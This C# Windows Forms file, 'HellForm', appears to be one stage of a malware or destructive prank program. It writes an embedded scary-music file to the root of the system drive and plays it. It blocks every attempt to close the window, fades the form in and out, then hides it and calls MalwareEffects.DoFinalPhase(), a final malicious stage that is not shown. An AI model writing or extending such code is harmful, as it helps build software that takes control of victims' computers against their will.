using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

public partial class HellForm : Form
{
    [DllImport("winmm.dll")]
    private static extern uint mciSendString(string lpstrCommand, StringBuilder lpstrReturnString, int uReturnLength, IntPtr hWndCallback);

    public HellForm()
    {
        InitializeComponent();
        Opacity = 0;
        timer1.Start();
        string rootDir = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":";
        File.WriteAllBytes($"{rootDir}\\scary_music.mp3", Saientologi.Properties.Resources.scary_music);
        mciSendString($"open \"{rootDir}\\scary_music.mp3\" alias scary_music", null, 0, IntPtr.Zero);
        mciSendString("play scary_music", null, 0, IntPtr.Zero);
    }

    private void HellForm_FormClosing(object sender, FormClosingEventArgs e)
    {
        e.Cancel = true;
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
        try
        {
            if (Opacity >= 1.0D)
            {
                CloseAll();
            }
            else
            {
                Opacity += 0.02;
            }
        }
        catch
        {
            CloseAll();
        }
    }

    private void CloseAll()
    {
        timer1.Stop();
        timer2.Start();
    }

    private void timer2_Tick(object sender, EventArgs e)
    {
        timer2.Stop();
        timer3.Start();
    }

    private void timer3_Tick(object sender, EventArgs e)
    {
        if (Opacity >= 0.1)
        {
            Opacity -= 0.05;
        }
        else
        {
            timer3.Stop();
            TopMost = false;
            Opacity = 0;
            Size = new System.Drawing.Size(0, 0);
            Visible = false;
            WindowState = FormWindowState.Minimized;
            Hide();

            MalwareEffects.DoFinalPhase();
        }
    }
}